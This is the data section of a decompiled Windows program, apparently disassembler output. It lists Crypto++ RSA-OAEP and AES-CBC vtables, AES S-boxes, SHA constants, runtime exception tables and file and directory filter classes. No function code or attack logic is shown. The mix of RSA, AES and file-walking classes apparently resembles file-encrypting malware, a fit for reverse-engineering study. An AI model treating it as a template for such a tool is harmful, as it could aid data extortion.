void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_408E90; // weak
void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_409E55; // weak
void *CryptoPP::TF_EncryptorImpl<CryptoPP::TF_CryptoSchemeOptions<CryptoPP::TF_ES<CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>,int>,CryptoPP::RSA,CryptoPP::OAEP<CryptoPP::SHA1,CryptoPP::P1363_MGF1>>>::`vftable' = &sub_409E75; // weak
void *CryptoPP::BufferedTransformation::BlockingInputOnly::`vftable' = &sub_40AD76; // weak
void *CryptoPP::CombinedNameValuePairs::`vftable' = &loc_41D715; // weak
void *CryptoPP::FilterWithBufferedInput::`vftable' = &loc_41D735; // weak
void *CryptoPP::FilterWithBufferedInput::`vftable' = &sub_41D6DE; // weak
int (__thiscall *off_46D184)(void *Block, char) = &sub_41D754; // weak
void *off_46D278 = &loc_41D6E6; // weak
void *off_46D288 = &loc_41D6EE; // weak
void *CryptoPP::AlgorithmParametersTemplate<enum CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme>::`vftable' = &loc_41D6F6; // weak
void *CryptoPP::AlgorithmParameters::`vftable' = &sub_41ECB8; // weak
void *CryptoPP::OS_RNG_Err::`vftable' = &sub_40AD76; // weak
void *CryptoPP::NonblockingRng::`vftable' = &sub_41F04F; // weak
_UNKNOWN unk_46D740; // weak
void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable' = &sub_408F8A; // weak
void *std::bad_alloc::`vftable' = &unknown_libname_2; // weak
int SHA512_Constants_46DB90[] = { 1116352408 }; // weak
int SHA512_Constants_46DB94[] = { 1899447441 }; // weak
int SHA512_Constants_46DB98[] = { -1245643825 }; // weak
int SHA512_Constants_46DB9C[] = { -373957723 }; // weak
int dword_46DBA0[] = { 961987163 }; // weak
int dword_46DBA4[] = { 1508970993 }; // weak
int dword_46DBA8[] = { -1841331548 }; // weak
int dword_46DBAC[] = { -1424204075 }; // weak
int dword_46DBB0[] = { -670586216 }; // weak
int dword_46DBB4[] = { 310598401 }; // weak
int dword_46DBB8[] = { 607225278 }; // weak
int dword_46DBBC[] = { 1426881987 }; // weak
int dword_46DBC0[] = { 1925078388 }; // weak
int dword_46DBC4[] = { -2132889090 }; // weak
int dword_46DBC8[] = { -1680079193 }; // weak
int dword_46DBCC[33] =
{
  -1046744716,
  -459576895,
  -272742522,
  264347078,
  604807628,
  770255983,
  1249150122,
  1555081692,
  1996064986,
  -1740746414,
  -1473132947,
  -1341970488,
  -1084653625,
  -958395405,
  -710438585,
  113926993,
  338241895,
  666307205,
  773529912,
  1294757372,
  1396182291,
  1695183700,
  1986661051,
  -2117940946,
  -1838011259,
  -1564481375,
  -1474664885,
  -1035236496,
  -949202525,
  -778901479,
  -694614492,
  -200395387,
  275423344
}; // weak
_UNKNOWN unk_46DC50; // weak
_UNKNOWN SHA256_Constants_46DF10; // weak
void *CryptoPP::HashInputTooLong::`vftable' = &sub_40AD76; // weak
void *CryptoPP::RandomPool::`vftable' = &sub_4244FB; // weak
void *CryptoPP::SHA256::`vftable' = &sub_42451D; // weak
int (__thiscall *off_46E07C)(void *Block, char) = &sub_408E6B; // weak
void *off_46E0BC = &loc_409E85; // weak
void *CryptoPP::ByteQueue::`vftable' = &loc_424CB4; // weak
void *CryptoPP::ByteQueue::`vftable' = &sub_424CAC; // weak
void *CryptoPP::StringSinkTemplate<std::string>::`vftable' = &sub_408D3C; // weak
void *CryptoPP::StringSinkTemplate<std::string>::`vftable' = &sub_409EA5; // weak
void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable' = &sub_40701C; // weak
void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable' = &sub_409E65; // weak
void *CryptoPP::StringSource::`vftable' = &sub_40701C; // weak
void *CryptoPP::StringSource::`vftable' = &sub_409E65; // weak
void *CryptoPP::BaseN_Decoder::`vftable' = &sub_4072B2; // weak
void *CryptoPP::BaseN_Decoder::`vftable' = &sub_409E7D; // weak
void *CryptoPP::HexDecoder::`vftable' = &sub_4072B2; // weak
void *CryptoPP::HexDecoder::`vftable' = &sub_409E7D; // weak
void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable' = &sub_40635D; // weak
void *CryptoPP::MessageQueue::`vftable' = &loc_4274D2; // weak
void *CryptoPP::MessageQueue::`vftable' = &sub_4274CA; // weak
_UNKNOWN unk_46E6C4; // weak
char RijnDael_AES_LONG_46E6E8[256] =
{
  'c',
  '|',
  'w',
  '{',
  '\xF2',
  'k',
  'o',
  '\xC5',
  '0',
  '\x01',
  'g',
  '+',
  '\xFE',
  '\xD7',
  '\xAB',
  'v',
  '\xCA',
  '\x82',
  '\xC9',
  '}',
  '\xFA',
  'Y',
  'G',
  '\xF0',
  '\xAD',
  '\xD4',
  '\xA2',
  '\xAF',
  '\x9C',
  '\xA4',
  'r',
  '\xC0',
  '\xB7',
  '\xFD',
  '\x93',
  '&',
  '6',
  '?',
  '\xF7',
  '\xCC',
  '4',
  '\xA5',
  '\xE5',
  '\xF1',
  'q',
  '\xD8',
  '1',
  '\x15',
  '\x04',
  '\xC7',
  '#',
  '\xC3',
  '\x18',
  '\x96',
  '\x05',
  '\x9A',
  '\a',
  '\x12',
  '',
  '\xE2',
  '\xEB',
  '\'',
  '\xB2',
  'u',
  '\t',
  '\x83',
  ',',
  '\x1A',
  '\x1B',
  'n',
  'Z',
  '\xA0',
  'R',
  ';',
  '\xD6',
  '\xB3',
  ')',
  '\xE3',
  '/',
  '\x84',
  'S',
  '\xD1',
  '\0',
  '\xED',
  ' ',
  '\xFC',
  '\xB1',
  '[',
  'j',
  '\xCB',
  '\xBE',
  '9',
  'J',
  'L',
  'X',
  '\xCF',
  '\xD0',
  '\xEF',
  '\xAA',
  '\xFB',
  'C',
  'M',
  '3',
  '\x85',
  'E',
  '\xF9',
  '\x02',
  '\x7F',
  'P',
  '<',
  '\x9F',
  '\xA8',
  'Q',
  '\xA3',
  '@',
  '\x8F',
  '\x92',
  '\x9D',
  '8',
  '\xF5',
  '\xBC',
  '\xB6',
  '\xDA',
  '!',
  '\x10',
  '\xFF',
  '\xF3',
  '\xD2',
  '\xCD',
  '\f',
  '\x13',
  '\xEC',
  '_',
  '\x97',
  'D',
  '\x17',
  '\xC4',
  '\xA7',
  '~',
  '=',
  'd',
  ']',
  '\x19',
  's',
  '`',
  '\x81',
  'O',
  '\xDC',
  '\"',
  '*',
  '\x90',
  '\x88',
  'F',
  '\xEE',
  '\xB8',
  '\x14',
  '\xDE',
  '^',
  '\v',
  '\xDB',
  '\xE0',
  '2',
  ':',
  '\n',
  'I',
  '\x06',
  '$',
  '\\',
  '\xC2',
  '\xD3',
  '\xAC',
  'b',
  '\x91',
  '\x95',
  '\xE4',
  'y',
  '\xE7',
  '\xC8',
  '7',
  'm',
  '\x8D',
  '\xD5',
  'N',
  '\xA9',
  'l',
  'V',
  '\xF4',
  '\xEA',
  'e',
  'z',
  '\xAE',
  '\b',
  '\xBA',
  'x',
  '%',
  '.',
  '\x1C',
  '\xA6',
  '\xB4',
  '\xC6',
  '\xE8',
  '\xDD',
  't',
  '\x1F',
  'K',
  '\xBD',
  '\x8B',
  '\x8A',
  'p',
  '>',
  '\xB5',
  'f',
  'H',
  '\x03',
  '\xF6',
  '\x0E',
  'a',
  '5',
  'W',
  '\xB9',
  '\x86',
  '\xC1',
  '\x1D',
  '\x9E',
  '\xE1',
  '\xF8',
  '\x98',
  '\x11',
  'i',
  '\xD9',
  '\x8E',
  '\x94',
  '\x9B',
  '\x1E',
  '\x87',
  '\xE9',
  '\xCE',
  'U',
  '(',
  '\xDF',
  '\x8C',
  '\xA1',
  '\x89',
  '\r',
  '\xBF',
  '\xE6',
  'B',
  'h',
  'A',
  '\x99',
  '-',
  '\x0F',
  '\xB0',
  'T',
  '\xBB',
  '\x16'
}; // weak
char RijnDael_AES_inv_LONG_46E7E8[256] =
{
  'R',
  '\t',
  'j',
  '\xD5',
  '0',
  '6',
  '\xA5',
  '8',
  '\xBF',
  '@',
  '\xA3',
  '\x9E',
  '\x81',
  '\xF3',
  '\xD7',
  '\xFB',
  '|',
  '\xE3',
  '9',
  '\x82',
  '\x9B',
  '/',
  '\xFF',
  '\x87',
  '4',
  '\x8E',
  'C',
  'D',
  '\xC4',
  '\xDE',
  '\xE9',
  '\xCB',
  'T',
  '{',
  '\x94',
  '2',
  '\xA6',
  '\xC2',
  '#',
  '=',
  '\xEE',
  'L',
  '\x95',
  '\v',
  'B',
  '\xFA',
  '\xC3',
  'N',
  '\b',
  '.',
  '\xA1',
  'f',
  '(',
  '\xD9',
  '$',
  '\xB2',
  'v',
  '[',
  '\xA2',
  'I',
  'm',
  '\x8B',
  '\xD1',
  '%',
  'r',
  '\xF8',
  '\xF6',
  'd',
  '\x86',
  'h',
  '\x98',
  '\x16',
  '\xD4',
  '\xA4',
  '\\',
  '\xCC',
  ']',
  'e',
  '\xB6',
  '\x92',
  'l',
  'p',
  'H',
  'P',
  '\xFD',
  '\xED',
  '\xB9',
  '\xDA',
  '^',
  '\x15',
  'F',
  'W',
  '\xA7',
  '\x8D',
  '\x9D',
  '\x84',
  '\x90',
  '\xD8',
  '\xAB',
  '\0',
  '\x8C',
  '\xBC',
  '\xD3',
  '\n',
  '\xF7',
  '\xE4',
  'X',
  '\x05',
  '\xB8',
  '\xB3',
  'E',
  '\x06',
  '\xD0',
  ',',
  '\x1E',
  '\x8F',
  '\xCA',
  '?',
  '\x0F',
  '\x02',
  '\xC1',
  '\xAF',
  '\xBD',
  '\x03',
  '\x01',
  '\x13',
  '\x8A',
  'k',
  ':',
  '\x91',
  '\x11',
  'A',
  'O',
  'g',
  '\xDC',
  '\xEA',
  '\x97',
  '\xF2',
  '\xCF',
  '\xCE',
  '\xF0',
  '\xB4',
  '\xE6',
  's',
  '\x96',
  '\xAC',
  't',
  '\"',
  '\xE7',
  '\xAD',
  '5',
  '\x85',
  '\xE2',
  '\xF9',
  '7',
  '\xE8',
  '\x1C',
  'u',
  '\xDF',
  'n',
  'G',
  '\xF1',
  '\x1A',
  'q',
  '\x1D',
  ')',
  '\xC5',
  '\x89',
  'o',
  '\xB7',
  'b',
  '\x0E',
  '\xAA',
  '\x18',
  '\xBE',
  '\x1B',
  '\xFC',
  'V',
  '>',
  'K',
  '\xC6',
  '\xD2',
  'y',
  ' ',
  '\x9A',
  '\xDB',
  '\xC0',
  '\xFE',
  'x',
  '\xCD',
  'Z',
  '\xF4',
  '\x1F',
  '\xDD',
  '\xA8',
  '3',
  '\x88',
  '\a',
  '\xC7',
  '1',
  '\xB1',
  '\x12',
  '\x10',
  'Y',
  '\'',
  '',
  '\xEC',
  '_',
  '`',
  'Q',
  '\x7F',
  '\xA9',
  '\x19',
  '\xB5',
  'J',
  '\r',
  '-',
  '\xE5',
  'z',
  '\x9F',
  '\x93',
  '\xC9',
  '\x9C',
  '\xEF',
  '\xA0',
  '\xE0',
  ';',
  'M',
  '\xAE',
  '*',
  '\xF5',
  '\xB0',
  '\xC8',
  '\xEB',
  '\xBB',
  '<',
  '\x83',
  'S',
  '\x99',
  'a',
  '\x17',
  '+',
  '\x04',
  '~',
  '\xBA',
  'w',
  '\xD6',
  '&',
  '\xE1',
  'i',
  '\x14',
  'c',
  'U',
  '!',
  '\f',
  '}'
}; // weak
_UNKNOWN unk_46E8EC; // weak
__int128 xmmword_46E910 = 0x102030405060708090A0B0C0D0E0Fi64; // weak
__int128 xmmword_46E920 = 0x3020100070605040B0A09080F0E0D0Ci64; // weak
__int128 xmmword_46E930 = 0xC0D0E0F08090A0B0405060700010203i64; // weak
__int128 xmmword_46E940 = 0xF0E0D0C0B0A09080706050403020100i64; // weak
void *std::logic_error::`vftable' = &unknown_libname_2; // weak
void *std::invalid_argument::`vftable' = &unknown_libname_2; // weak
void *std::length_error::`vftable' = &unknown_libname_2; // weak
void *std::out_of_range::`vftable' = &unknown_libname_2; // weak
void *std::bad_array_new_length::`vftable' = &unknown_libname_2; // weak
void *std::ios_base::`vftable' = &sub_403901; // weak
void *std::streambuf::`vftable' = &sub_405008; // weak
void *std::filebuf::`vftable' = &sub_404FE6; // weak
void *std::ios::`vftable' = &sub_405077; // weak
void *std::ostream::`vftable' = &sub_40621B; // weak
void *std::codecvt<char,char,_Mbstatet>::`vftable' = &unknown_libname_16; // weak
_UNKNOWN unk_46ECD0; // weak
void *std::istream::`vftable' = &sub_429FBC; // weak
_UNKNOWN unk_46ECF4; // weak
void *std::ctype<wchar_t>::`vftable' = &std::ctype<wchar_t>::`scalar deleting destructor'; // weak
void *std::wstreambuf::`vftable' = &sub_42A3DF; // weak
void *std::wfilebuf::`vftable' = &sub_42A340; // weak
void *std::wios::`vftable' = &unknown_libname_28; // weak
void *std::wostream::`vftable' = &sub_42A338; // weak
_UNKNOWN unk_46EDF8; // weak
char *const Mode = &unk_46EE44; // idb
int dword_46EE74[] = { 1 }; // weak
int dword_46EE78[14] = { 2, 18, 10, 33, 34, 50, 42, 3, 19, 11, 35, 51, 43, 0 }; // weak
void *Concurrency::details::stl_critical_section_vista::`vftable' = &Concurrency::details::stl_critical_section_vista::lock; // weak
void *Concurrency::details::stl_critical_section_win7::`vftable' = &sub_42B488; // weak
void *Concurrency::details::stl_critical_section_concrt::`vftable' = &sub_42B475; // weak
void *Concurrency::details::stl_condition_variable_vista::`vftable' = &Concurrency::details::stl_condition_variable_vista::wait; // weak
void *Concurrency::details::stl_condition_variable_win7::`vftable' = &Concurrency::details::stl_condition_variable_win7::wait; // weak
void *Concurrency::details::stl_condition_variable_concrt::`vftable' = &Concurrency::details::stl_condition_variable_concrt::wait; // weak
_UNKNOWN unk_470C20; // weak
void *type_info::`vftable' = &sub_42CF8A; // weak
void *Concurrency::improper_lock::`vftable' = &unknown_libname_2; // weak
void *Concurrency::details::WaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::SingleWaitBlock::`vftable' = &sub_42F0CF; // weak
void *Concurrency::details::MultiWaitBlock::`vftable' = &_purecall; // weak
void *Concurrency::details::WaitAllBlock::`vftable' = &sub_42F182; // weak
void *Concurrency::details::WaitAnyBlock::`vftable' = &sub_42F1C9; // weak
void *Concurrency::details::TimedSingleWaitBlock::`vftable' = &sub_42F129; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::Context *>::`vftable' = &sub_42EE64; // weak
void *Concurrency::scheduler_resource_allocation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::scheduler_worker_creation_error::`vftable' = &std::regex_error::`scalar deleting destructor'; // weak
void *Concurrency::unsupported_os::`vftable' = &unknown_libname_2; // weak
void *Concurrency::improper_scheduler_attach::`vftable' = &unknown_libname_2; // weak
void *Concurrency::improper_scheduler_reference::`vftable' = &unknown_libname_2; // weak
void *Concurrency::context_unblock_unbalanced::`vftable' = &unknown_libname_2; // weak
void *Concurrency::context_self_unblock::`vftable' = &unknown_libname_2; // weak
void *Concurrency::missing_wait::`vftable' = &unknown_libname_2; // weak
void *Concurrency::invalid_scheduler_policy_key::`vftable' = &unknown_libname_2; // weak
void *Concurrency::invalid_scheduler_policy_value::`vftable' = &unknown_libname_2; // weak
void *Concurrency::invalid_scheduler_policy_thread_specification::`vftable' = &unknown_libname_2; // weak
void *Concurrency::nested_scheduler_missing_detach::`vftable' = &unknown_libname_2; // weak
void *Concurrency::invalid_oversubscribe_operation::`vftable' = &unknown_libname_2; // weak
void *Concurrency::invalid_operation::`vftable' = &unknown_libname_2; // weak
void *Concurrency::details::GlobalCore::TopologyObject::`vftable' = &sub_4325C0; // weak
void *Concurrency::details::GlobalNode::TopologyObject::`vftable' = &sub_4325D7; // weak
void *Concurrency::details::ResourceManager::`vftable' = &sub_433812; // weak
void *Concurrency::ScheduleGroup::`vftable' = &_purecall; // weak
void *Concurrency::Scheduler::`vftable' = &sub_434F21; // weak
void *Concurrency::details::RealizedChore::`vftable' = &std::_Ref_count<__ExceptionPtr>::`scalar deleting destructor'; // weak
void *Concurrency::details::SchedulerBase::`vftable' = &sub_434F44; // weak
void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable' = &sub_434E93; // weak
void *Concurrency::details::CacheLocalScheduleGroup::`vftable' = &sub_440758; // weak
void *Concurrency::details::FairScheduleGroupSegment::`vftable' = &sub_434E93; // weak
void *Concurrency::details::FairScheduleGroup::`vftable' = &sub_440758; // weak
void *Concurrency::Context::`vftable' = &_purecall; // weak
void *Concurrency::details::ContextBase::`vftable' = &sub_438AF1; // weak
void *Concurrency::details::_Interruption_exception::`vftable' = &unknown_libname_2; // weak
void *Concurrency::details::_RefCounter::`vftable' = &unknown_libname_49; // weak
void *Concurrency::details::_CancellationTokenRegistration::`vftable' = &sub_4395B5; // weak
void *Concurrency::details::CancellationTokenRegistration_TaskProc::`vftable' = &sub_439593; // weak
void *Concurrency::details::_MallocaArrayHolder<Concurrency::event *>::`vftable' = &sub_439571; // weak
_UNKNOWN unk_471198; // weak
char *off_4711C0[11] =
{
  "SchedulerKind",
  "MaxConcurrency",
  "MinConcurrency",
  "TargetOversubscriptionFactor",
  "LocalContextCacheSize",
  "ContextStackSize",
  "ContextPriority",
  "SchedulingProtocol",
  "DynamicProgressFeedback",
  "WinRTInitialization",
  "MaxPolicyElementKey"
}; // weak
void *Concurrency::details::ExecutionResource::`vftable' = &sub_43A688; // weak
void *Concurrency::details::SchedulerProxy::`vftable' = &sub_43BDE4; // weak
void *Concurrency::details::FreeThreadProxy::`vftable' = &sub_44241A; // weak
void *Concurrency::details::IThreadProxyFactory::`vftable' = &_purecall; // weak
int dword_4713BC[4] = { 0, 64, 256, 1024 }; // weak
int off_4713CC = 4726556; // weak
void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable' = &sub_43C435; // weak
void *Concurrency::details::FreeThreadProxyFactory::`vftable' = &sub_43C435; // weak
_UNKNOWN unk_471424; // weak
_DWORD dword_471444[4] = { -502718582, 1194401290, -720526716, 1632799356 }; // weak
_DWORD dword_471464[4] = { 1462214671, 1159286974, 1777817218, -872517224 }; // weak
_DWORD dword_471484[4] = { 791117919, 1321997942, -1333855594, 791692445 }; // weak
void *Concurrency::details::VirtualProcessor::`vftable' = &sub_43CAAB; // weak
int dword_4715B0[98] =
{
  8,
  16,
  24,
  32,
  40,
  48,
  56,
  64,
  72,
  80,
  88,
  96,
  104,
  112,
  120,
  128,
  136,
  144,
  152,
  160,
  168,
  176,
  184,
  192,
  200,
  208,
  216,
  224,
  232,
  240,
  248,
  256,
  272,
  288,
  304,
  320,
  336,
  352,
  368,
  384,
  400,
  416,
  432,
  448,
  464,
  480,
  496,
  512,
  544,
  576,
  608,
  640,
  672,
  704,
  736,
  768,
  800,
  832,
  864,
  896,
  928,
  960,
  992,
  1024,
  1088,
  1152,
  1216,
  1280,
  1344,
  1408,
  1472,
  1536,
  1600,
  1664,
  1728,
  1792,
  1856,
  1920,
  1984,
  2048,
  2176,
  2304,
  2432,
  2560,
  2688,
  2816,
  2944,
  3072,
  3200,
  3328,
  3456,
  3584,
  3712,
  3840,
  3968,
  4096,
  3,
  4096
}; // weak
void *Concurrency::IExecutionContext::`vftable' = &_purecall; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_408AB6; // weak
void *Concurrency::details::InternalContextBase::`vftable' = &sub_43E6E5; // weak
void *Concurrency::details::ScheduleGroupSegmentBase::`vftable' = &sub_43FA93; // weak
void *Concurrency::details::ScheduleGroupBase::`vftable' = &sub_440758; // weak
void *Concurrency::details::ExternalContextBase::`vftable' = &sub_438AF1; // weak
void *Concurrency::IScheduler::`vftable' = &_purecall; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_408AB6; // weak
void *Concurrency::details::ThreadInternalContext::`vftable' = &sub_43E6E5; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &sub_44131B; // weak
void *Concurrency::details::ThreadScheduler::`vftable' = &loc_441203; // weak
void *Concurrency::details::VirtualProcessorRoot::`vftable' = &sub_43A684; // weak
void *Concurrency::details::FreeVirtualProcessorRoot::`vftable' = &sub_43A684; // weak
void *Concurrency::details::ThreadProxy::`vftable' = &sub_44241A; // weak
int dword_471A00[] = { 1 }; // weak
int dword_471A0C[3] = { 1, 0, 2 }; // weak
void *Concurrency::details::ThreadVirtualProcessor::`vftable' = &sub_443B2D; // weak
void *std::bad_typeid::`vftable' = &unknown_libname_2; // weak
void *std::__non_rtti_object::`vftable' = &unknown_libname_2; // weak
void *std::bad_exception::`vftable' = &unknown_libname_2; // weak
void *charNode::`vftable' = &sub_403324; // weak
int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_alloc>::`vftable'[2])() = { &_guard_check_icall_nop, &_guard_check_icall_nop }; // weak
int (*`anonymous namespace'::_ExceptionPtr_static<std::bad_exception>::`vftable'[2])() = { &_guard_check_icall_nop, &_guard_check_icall_nop }; // weak
_UNKNOWN unk_47D3F4; // weak
void *FilterFile::`vftable' = &sub_402D23; // weak
void *std::ofstream::`vftable' = &sub_406223; // weak
_UNKNOWN unk_47EA34; // weak
void *WorkerFile::`vftable' = &sub_402D96; // weak
void *FileUtil::IFilter::`vftable' = &unknown_libname_6; // weak
_UNKNOWN unk_47EA6C; // weak
void *FilterDir::`vftable' = &sub_402D5E; // weak
const WCHAR word_47EA8C = 92u; // idb
void *CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable' = &sub_409E6D; // weak
_UNKNOWN unk_47ECB8; // weak
_UNKNOWN unk_47ECC0; // weak
char aEncodingparame[19] = "EncodingParameters"; // weak
void *CryptoPP::CipherModeFinalTemplate_CipherHolder<CryptoPP::BlockCipherFinal<0,CryptoPP::Rijndael::Enc>,CryptoPP::CBC_Encryption>::`vftable' = &sub_408B17; // weak
void *CryptoPP::AutoSeededRandomPool::`vftable' = &sub_4071B9; // weak
const WCHAR word_47F184 = 46u; // idb
const _ThrowInfo _TI4_AVBERDecodeErr_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVBERDecodeErr_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVSelfTestFailure_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVSelfTestFailure_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVInvalidKeyLength_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVInvalidKeyLength_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUNoChannelSupport_BufferedTransformation_CryptoPP__ =
{
  0u,
  &sub_4063A0,
  NULL,
  &_CTA4_AUNoChannelSupport_BufferedTransformation_CryptoPP__
}; // idb
const _ThrowInfo _TI4_AVInvalidCiphertext_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVInvalidCiphertext_CryptoPP__ }; // idb
const _ThrowInfo _TI2_AVruntime_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVruntime_error_std__ }; // idb
const _ThrowInfo _TI3_AVDivideByZero_Integer_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVDivideByZero_Integer_CryptoPP__ }; // idb
const _ThrowInfo _TI2_AVException_CryptoPP__ = { 0u, &sub_4062E4, NULL, &_CTA2_AVException_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__ =
{
  0u,
  &sub_4063A0,
  NULL,
  &_CTA4_AUBlockingInputOnly_BufferedTransformation_CryptoPP__
}; // idb
__TI_flags _TI3_AVInvalidDataFormat_CryptoPP__ = 0; // weak
const _ThrowInfo _TI3_AVOS_RNG_Err_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVOS_RNG_Err_CryptoPP__ }; // idb
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI4_AVHashInputTooLong_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVHashInputTooLong_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVinvalid_argument_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVinvalid_argument_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVlength_error_std__ }; // idb
const _ThrowInfo _TI3_AVout_of_range_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVout_of_range_std__ }; // idb
const _ThrowInfo _TI2_AVimproper_lock_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVimproper_lock_Concurrency__ }; // idb
const _ThrowInfo _TI2_AVscheduler_resource_allocation_error_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVscheduler_resource_allocation_error_Concurrency__
}; // idb
__TI_flags _TI2_AVinvalid_operation_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVunsupported_os_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVunsupported_os_Concurrency__ }; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_reference_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVimproper_scheduler_reference_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_attach_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVimproper_scheduler_attach_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVmissing_wait_Concurrency__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVmissing_wait_Concurrency__ }; // idb
const _ThrowInfo _TI2_AV_Interruption_exception_details_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AV_Interruption_exception_details_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_key_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_key_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_value_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_scheduler_policy_value_Concurrency__
}; // idb
__TI_flags _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVcontext_unblock_unbalanced_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVcontext_unblock_unbalanced_Concurrency__
}; // idb
__TI_flags _TI2_AVcontext_self_unblock_Concurrency__ = 0; // weak
const _ThrowInfo _TI2_AVinvalid_oversubscribe_operation_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVinvalid_oversubscribe_operation_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVnested_scheduler_missing_detach_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA2_AVnested_scheduler_missing_detach_Concurrency__
}; // idb
const _ThrowInfo _TI3_AVscheduler_worker_creation_error_Concurrency__ =
{
  0u,
  &unknown_libname_1,
  NULL,
  &_CTA3_AVscheduler_worker_creation_error_Concurrency__
}; // idb
const _ThrowInfo _TI2_AVbad_exception_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_exception_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_1, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
const _ThrowInfo _TI2_AVbad_cast_std__ = { 0u, &unknown_libname_1, NULL, &_CTA2_AVbad_cast_std__ }; // idb
__TI_flags _TI5_AVfailure_ios_base_std__ = 0; // weak
const _ThrowInfo _TI3_AVCannotFlush_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVCannotFlush_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVNotImplemented_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVNotImplemented_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__ =
{
  0u,
  &sub_4063A0,
  NULL,
  &_CTA4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__
}; // idb
const _ThrowInfo _TI3_AVInvalidArgument_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA3_AVInvalidArgument_CryptoPP__ }; // idb
const _ThrowInfo _TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__ =
{
  0u,
  &sub_4063A0,
  NULL,
  &_CTA3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__
}; // idb
const _ThrowInfo _TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVValueTypeMismatch_NameValuePairs_CryptoPP__ }; // idb
const _ThrowInfo _TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__ = { 0u, &sub_4063A0, NULL, &_CTA4_AVInvalidMaterial_CryptoMaterial_CryptoPP__ }; // idb
